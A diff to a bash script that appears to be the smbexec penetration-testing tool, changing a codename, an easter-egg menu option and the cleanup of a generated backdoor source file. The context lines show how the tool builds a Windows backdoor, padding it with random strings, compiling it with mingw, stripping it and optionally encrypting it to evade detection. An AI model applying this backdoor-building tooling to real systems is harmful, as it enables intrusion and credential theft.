@@ -25,7 +25,7 @@
 #############################################################################################
 
 version="1.2.8"
-codename="Rolling Development"
+codename="Take On Me"
 # Check to see if X is running
 if [ -z $(pidof X) ] && [ -z $(pidof Xorg) ]; then
 	isxrunning=
@@ -169,7 +169,7 @@ echo -e "\e[1;34m[*]\e[0m Let's get your payload setup...\n"
 		for (( i=1; i<=999999;i++ )) do echo ${RANDOM} ${i}; done | sort -k1| cut -d " " -f2| head -${seed} | sed 's/$/"/' | sed 's/^/"/'| sed '$a;' >> ${logfldr}/backdoor.c
 		echo -e "\n\e[1;34m[*]\e[0m Compiling executable..."
 		${mingw} -Wall ${logfldr}/backdoor.c -o ${logfldr}/backdoor.exe > /dev/null 2>&1
-		#rm ${logfldr}/backdoor.c 
+		rm ${logfldr}/backdoor.c 
 		strip --strip-debug ${logfldr}/backdoor.exe
 
 		if [ -z "${enable_crypter}" ]; then
@@ -1006,8 +1006,8 @@ if [ "${run_as_system}" == "y" ]; then
 	get_system=--system
 fi
 }
-f_sd(){
-xdg-open http://www.youtube.com/watch?v=cWb2Im55fL8 >& /tmp/smbexec/ddmdjunk
+f_rbf(){
+xdg-open http://www.youtube.com/watch?v=QHpU0ZfXZ_g >& /tmp/smbexec/ddmdjunk
 f_mainmenu
 }
 
@@ -1219,7 +1219,7 @@ case "${mainchoice}" in
 	2) f_system_exploitation_menu;;
 	3) f_obtain_hashes_menu;;
 	4) if [[ -z $(ls ${logfldr}) ]];then rm -rf ${logfldr}; fi;clear;f_freshstart;exit;;
-	1983) f_sd;;
+	RBF) f_rbf;;
 	*) f_mainmenu
 esac
 }
